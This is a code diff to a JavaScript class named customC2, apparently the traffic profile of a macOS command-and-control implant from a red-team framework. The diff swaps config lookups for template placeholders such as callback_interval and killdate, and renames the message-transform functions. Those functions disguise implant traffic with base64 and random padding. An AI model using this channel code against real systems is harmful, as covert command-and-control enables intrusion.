@@ -7,9 +7,8 @@ class customC2 extends baseC2{
 		this.c2_config = raw_c2_config;
 		this.get_messages = this.c2_config['GET']['AgentMessage'];
         this.post_messages = this.c2_config['POST']['AgentMessage'];
-        this.interval = this.c2_config['interval'];
-        this.chunk_size = this.c2_config['chunk_size'];
-        this.jitter = this.c2_config['jitter'];
+        this.interval = callback_interval;
+        this.jitter = callback_jitter;
         this.aes_psk = "AESPSK"; // base64 encoded key
         if(this.aes_psk !== ""){
 		    this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
@@ -21,12 +20,12 @@ class customC2 extends baseC2{
             let err = Ref();
             this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
 		}
-        this.using_key_exchange = this.c2_config['key_exchange'];
+        this.using_key_exchange = "encrypted_exchange_check" === "true";
         this.exchanging_keys = this.using_key_exchange;
         this.dateFormatter = $.NSDateFormatter.alloc.init;
         this.dateFormatter.setDateFormat("yyyy-MM-dd");
-        if(this.c2_config['kill_date'] !== undefined && this.c2_config['kill_date'] !== ""){
-            this.kill_date = this.dateFormatter.dateFromString(this.c2_config['kill_date']);
+        if("killdate" !== undefined && "killdate" !== ""){
+            this.kill_date = this.dateFormatter.dateFromString("killdate");
         }else{
             this.kill_date = $.NSDate.distantFuture;
         }
@@ -163,33 +162,33 @@ class customC2 extends baseC2{
   prepend(){
     return arguments[1] + arguments[0];
   }
-  r_prepend(){
+  reverse_prepend(){
     return arguments[0].slice(String(arguments[1]).length);
   }
   append(){
     return arguments[0] + arguments[1];
   }
-  r_append(){
+  reverse_append(){
     return arguments[0].slice(0, -1 * String(arguments[1]).length);
   }
   b64(){
     return base64_encode(String(arguments[0]));
   }
-  r_b64(){
+  reverse_b64(){
     return base64_decode(String(arguments[0]));
   }
   random_mixed(){
       let m = [...Array(Number(arguments[1]))].map(i=>(~~(Math.random()*36)).toString(36)).join('');
       return arguments[0] + m;
   }
-  r_random_mixed(){
+  reverse_random_mixed(){
       return arguments[0].slice(0, -1 * Number(arguments[1]));
     }
   random_number(){
       let m = [...Array(Number(arguments[1]))].map(i=>(~~(Math.random()*10)).toString(10)).join('');
       return arguments[0] + m;
   }
-  r_random_number(){
+  reverse_random_number(){
       return arguments[0].slice(0, -1 * Number(arguments[1]));
     }
   random_alpha(){
@@ -197,7 +196,7 @@ class customC2 extends baseC2{
       let m = Array(Number(arguments[1])).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
       return arguments[0] + m;
   }
-  r_random_alpha(){
+  reverse_random_alpha(){
       return arguments[0].slice(0, -1 * Number(arguments[1]));
     }
   choose_random(){
@@ -205,7 +204,7 @@ class customC2 extends baseC2{
         if(choice === arguments[1].length){choice -= 1;}
         return arguments[0] + arguments[1][choice];
     }
-    r_choose_random(){
+    reverse_choose_random(){
 	    for(let i = 0; i < arguments[1].length; i++){
 	        if(arguments[0].includes(arguments[1][i])){
 	            return arguments[0].replace(arguments[1][i], "");
@@ -220,25 +219,25 @@ class customC2 extends baseC2{
               for (let i = transforms.length - 1; i >= 0; i--) {
                   switch (transforms[i]['function']) {
                       case "base64":
-                          tmp = this.r_b64(tmp);
+                          tmp = this.reverse_b64(tmp);
                           break;
                       case "prepend":
-                          tmp = this.r_prepend(tmp, transforms[i]['parameters']);
+                          tmp = this.reverse_prepend(tmp, transforms[i]['parameters']);
                           break;
                       case "append":
-                          tmp = this.r_append(tmp, transforms[i]['parameters']);
+                          tmp = this.reverse_append(tmp, transforms[i]['parameters']);
                           break;
                       case "random_mixed":
-                          tmp = this.r_random_mixed(tmp, transforms[i]['parameters']);
+                          tmp = this.reverse_random_mixed(tmp, transforms[i]['parameters']);
                           break;
                       case "random_number":
-                          tmp = this.r_random_number(tmp, transforms[i]['parameters']);
+                          tmp = this.reverse_random_number(tmp, transforms[i]['parameters']);
                           break;
                       case "random_alpha":
-                          tmp = this.r_random_alpha(tmp, transforms[i]['parameters']);
+                          tmp = this.reverse_random_alpha(tmp, transforms[i]['parameters']);
                           break;
                       case "choose_random":
-                          tmp = this.r_choose_random(tmp, transforms[i]['parameters']);
+                          tmp = this.reverse_choose_random(tmp, transforms[i]['parameters']);
                   }
               }
           }
